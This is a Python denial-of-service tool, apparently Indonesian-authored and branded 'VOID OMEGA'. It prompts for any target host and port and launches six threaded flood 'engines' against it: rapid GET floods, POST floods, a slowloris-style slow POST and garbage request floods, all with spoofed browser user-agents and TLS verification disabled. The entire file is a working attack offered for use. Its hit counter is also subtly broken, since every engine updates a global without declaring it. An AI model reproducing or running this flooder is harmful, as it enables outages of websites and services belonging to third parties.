import socket
import os
import sys
import time
import threading
import random
import string
import math
import ssl

# ==================================================
# KONFIGURASI GLOBAL
# ==================================================
total_hits = 0
hit_lock = threading.Lock()
stop_event = threading.Event()
DEBUG_MODE = True  # Selalu aktif agar error terlihat

# ==================================================
# FUNGSI PENDUKUNG
# ==================================================
def rgb_text(text, offset=0):
    colored = []
    freq = 0.1
    for i, ch in enumerate(text):
        if ch == '\n':
            colored.append('\n')
            continue
        r = int(math.sin(freq * i + offset) * 127 + 128)
        g = int(math.sin(freq * i + offset + 2) * 127 + 128)
        b = int(math.sin(freq * i + offset + 4) * 127 + 128)
        colored.append(f"\033[38;2;{r};{g};{b}m{ch}")
    return "".join(colored) + "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

logo_omega = r"""
   ▄████████  ▄█   ▄█          ▄████████ ████████▄     ▄████████ 
  ███    ███ ███  ███         ███    ███ ███   ▀███   ███    ███ 
  ███    █▀  ███▌ ███         ███    ███ ███    ███   ███    █▀  
  ███        ███▌ ███        ▄███▄▄▄▄██▀ ███    ███  ▄███▄▄▄     
▀███████████ ███▌ ███       ▀▀███▀▀▀▀▀   ███    ███ ▀▀███▀▀▀     
         ███ ███  ███         ███    ███ ███    ███   ███    █▄  
   ▄█    ███ ███  ███▌    ▄   ███    ███ ███   ▄███   ███    ███ 
 ▄████████▀  █▀   █████▄▄██   ██████████ ████████▀    ██████████ 
                ▀                                                
        ╔═══════════════════════════════════════════╗
        ║     V O I D   O M E G A   (FIXED)        ║
        ║   TIMEOUT FIX + PAYLOAD REDUCED           ║
        ╚═══════════════════════════════════════════╝
               [ MODE: STABILIZED OBLITERATION ]
"""

# ==================================================
# ENGINE SERANGAN (DENGAN TIMEOUT DIPERPANJANG)
# ==================================================

def vulcan_engine(target, port, ssl_on, ip):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)  # DIPERPANJANG
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.connect((ip, port))
            for _ in range(30):  # Dikurangi dari 40
                if stop_event.is_set(): break
                path = ''.join(random.choices(string.ascii_lowercase, k=6))
                header = (
                    f"GET /{path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(100,120)}.0.0.0\r\n"
                    f"Accept: */*\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(header.encode())
                with hit_lock: total_hits += 1
                time.sleep(0.02)  # Jeda kecil
            s.close()
        except Exception as e:
            if DEBUG_MODE:
                print(f"\033[1;31m[ERROR VULCAN]\033[0m {e}")
            time.sleep(0.5)

def phantom_engine(target, port, ssl_on, ip):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.connect((ip, port))
            path = ''.join(random.choices(string.ascii_lowercase, k=8))
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=512))  # DIKECILKAN
            header = (
                f"POST /{path}?{random.randint(1,9999)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(110,122)}.0.0.0\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.send(header.encode())
            for _ in range(3):  # Dikurangi dari 5
                if stop_event.is_set(): break
                s.send(payload.encode())
                with hit_lock: total_hits += 1
                time.sleep(random.uniform(0.3, 0.8))
            s.close()
        except Exception as e:
            if DEBUG_MODE:
                print(f"\033[1;31m[ERROR PHANTOM]\033[0m {e}")
            time.sleep(0.5)

def oblivion_engine(target, port, ssl_on, ip):
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
    ]
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.connect((ip, port))
            header = (
                f"POST /?session={random.randint(1000,99999)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(ua_list)}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Connection: keep-alive\r\n"
                f"Content-Length: 2000\r\n"  # DIKECILKAN
                f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            )
            s.send(header.encode())
            while not stop_event.is_set():
                s.send(random.choice(string.ascii_letters).encode())
                with hit_lock: total_hits += 1
                time.sleep(random.randint(5, 10))
            s.close()
        except Exception as e:
            if DEBUG_MODE:
                print(f"\033[1;31m[ERROR OBLIVION]\033[0m {e}")
            time.sleep(0.5)

# ===== PERBAIKAN UTAMA: HEAVYPOST =====
def heavypost_engine(target, port, ssl_on, ip):
    payload_body = ''.join(random.choices(string.ascii_letters + string.digits, k=512))  # DIKECILKAN dari 2048
    content_len = len(payload_body)
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
    ]
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)  # DIPERPANJANG
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.connect((ip, port))
            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(ua_list)}\r\n"
                f"Accept: */*\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {content_len}\r\n"
                f"Connection: keep-alive\r\n\r\n"
                f"{payload_body}"
            )
            # Kirim 20 request per koneksi (dari 60)
            for _ in range(20):
                if stop_event.is_set(): break
                s.send(request.encode())
                with hit_lock: total_hits += 1
                time.sleep(0.05)  # Jeda untuk menghindari timeout
            s.close()
        except Exception as e:
            if DEBUG_MODE:
                print(f"\033[1;31m[ERROR HEAVYPOST]\033[0m {e}")
            time.sleep(1)  # Lebih lama agar tidak spam

# ===== PERBAIKAN UTAMA: GOLDENEYE =====
def goldeneye_engine(target, port, ssl_on, ip):
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"
    ]
    accept_h = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    lang_h = "en-US,en;q=0.9,id;q=0.8"
    enc_h = "gzip, deflate, br"
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)  # DIPERPANJANG
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.connect((ip, port))
            # Kurangi jumlah request per koneksi
            for _ in range(25):  # Dari 60
                if stop_event.is_set(): break
                rnd = ''.join(random.choices(string.ascii_letters + string.digits, k=4))  # Lebih pendek
                rnd_val = random.randint(1000, 9999)
                path = f"/?s={rnd}&q={rnd_val}&t={int(time.time())}"
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {random.choice(ua_list)}\r\n"
                    f"Accept: {accept_h}\r\n"
                    f"Accept-Language: {lang_h}\r\n"
                    f"Accept-Encoding: {enc_h}\r\n"
                    f"Cache-Control: no-cache, no-store\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Upgrade-Insecure-Requests: 1\r\n\r\n"
                )
                s.send(request.encode())
                with hit_lock: total_hits += 1
                time.sleep(0.03)  # Jeda kecil
            s.close()
        except Exception as e:
            if DEBUG_MODE:
                print(f"\033[1;31m[ERROR GOLDENEYE]\033[0m {e}")
            time.sleep(1)

def doomsday_engine(target, port, ssl_on, ip):
    garbage = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))  # DIKECILKAN dari 4096
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.connect((ip, port))
            for _ in range(20):  # Dikurangi
                if stop_event.is_set(): break
                method = random.choice(["GET", "POST"])
                path = f"/?v={random.randint(1,999)}&t={int(time.time())}"
                header = (
                    f"{method} {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) VOID-DOOMSDAY\r\n"
                    f"Content-Length: {len(garbage) if method == 'POST' else 0}\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                if method == "POST":
                    header += garbage
                s.send(header.encode())
                with hit_lock: total_hits += 1
                time.sleep(0.02)
            s.close()
        except Exception as e:
            if DEBUG_MODE:
                print(f"\033[1;31m[ERROR DOOMSDAY]\033[0m {e}")
            time.sleep(0.5)

# ==================================================
# MAIN EXECUTION
# ==================================================
def main():
    clear_screen()
    print(rgb_text(logo_omega, 5))
    print("\033[1;33m[!] TIMEOUT FIX: Payload diperkecil, timeout diperpanjang.\033[0m")
    
    target = input("\n\033[1;36m[?] Target Host/IP (tanpa http://): \033[0m").strip()
    if not target: return
    port = int(input("\033[1;36m[?] Port (80/443): \033[0m") or 80)
    ssl_on = (port == 443)
    
    total_threads = int(input("\033[1;36m[?] Total Threads (Rekomendasi 100-200): \033[0m") or 120)
    threads_per_engine = max(1, total_threads // 6)
    
    try:
        ip = socket.gethostbyname(target)
    except:
        print("\033[1;31m[!] Gagal resolve host.\033[0m")
        return

    print(f"\n\033[1;32m[✓] Target: {target} ({ip}) | Port: {port} | SSL: {'ON' if ssl_on else 'OFF'}\033[0m")
    print(f"\033[1;32m[✓] Threads per Engine: {threads_per_engine} (Total: {threads_per_engine * 6})\033[0m")
    print("\033[1;31m[!] MENEMBAKKAN 6 SENJATA (FIXED)... Tekan CTRL+C untuk stop.\033[0m")
    input("Tekan Enter untuk memulai...")

    stop_event.clear()
    global total_hits
    total_hits = 0

    engines = [
        (vulcan_engine, "Vulcan"),
        (phantom_engine, "Phantom"),
        (oblivion_engine, "Oblivion"),
        (heavypost_engine, "HeavyPost"),
        (goldeneye_engine, "GoldenEye"),
        (doomsday_engine, "Doomsday")
    ]

    for engine_func, name in engines:
        for _ in range(threads_per_engine):
            t = threading.Thread(target=engine_func, args=(target, port, ssl_on, ip))
            t.daemon = True
            t.start()
        print(f"\033[1;30m[+] {name} engine deployed with {threads_per_engine} threads.\033[0m")

    try:
        start_time = time.time()
        while not stop_event.is_set():
            elapsed = int(time.time() - start_time)
            sys.stdout.write(f"\r\033[1;36m[★] Total Hits: {total_hits} | Waktu: {elapsed}s | Status: OMEGA FIXED... (CTRL+C STOP)\033[0m")
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n\033[1;31m[!] OMEGA SHUTDOWN.\033[0m")
        time.sleep(1)

    print(f"\n\033[1;33m[!] Total Hits Akhir: {total_hits}\033[0m")
    input("\nTekan Enter untuk keluar...")

if __name__ == "__main__":
    main()
